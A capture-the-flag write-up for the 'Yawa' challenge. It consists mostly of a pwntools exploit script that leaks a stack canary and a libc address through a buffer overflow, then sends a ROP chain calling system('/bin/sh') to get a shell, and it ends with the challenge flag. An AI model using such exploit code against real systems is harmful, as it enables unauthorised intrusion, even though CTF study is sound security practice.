# Yawa
Solved by **[CapangJabba](https://www.linkedin.com/in/gnapaC/)**

## Question
Yet another welcome application.

## Solution
`exploit.py`
```
from pwn import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./yawa_patched", )
elf = context.binary = ELF("./yawa_patched", checksec=False)

libc = ELF('./libc.so.6')

# 0x7fffffffdce8 last in stack can reach

context.log_level = 'info'
offset_canary = 88
offset_to_return = 104


io.recvuntil(b'> ')
io.sendline(b'1')
pause()
info('Leaking Canary')
payload = 'A'*88
io.sendline(payload)
io.recvuntil(b'> ')
io.sendline(b'2')
print(io.recvline())
canary = u64(b'\x00' + io.recv(7))
print(hex(canary))



io.recvuntil(b'> ')
io.sendline(b'1')
payload= 'A'*103 
io.sendline(payload)
io.recvuntil(b'> ')
io.sendline(b'2')
io.recvline()
libc_addr = unpack(io.recv(6).ljust(8,b'\x00'))
print(f"libc_addr: {hex(libc_addr)}")
print(f"libc_start_main offset: {hex(libc.sym['__libc_start_main'])}")


base_address = libc_addr -0x29d90
libc.address = base_address
print(f"base_address: {hex(libc.address)}")
io.recvuntil(b'> ')
io.sendline(b'1')

rop =ROP(libc)
ret = libc.address + 0x00000000000f8c92
rop.system(next(libc.search(b'/bin/sh\x00')))

payload= b'A'*88 + p64(canary)

# offsets to rip = 104
payload+= b'A'*(104-len(payload))
payload += p64(ret)
payload += rop.chain()
io.sendline(payload)
io.sendline(b'100')
io.interactive()
```

### Flag
`DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}`
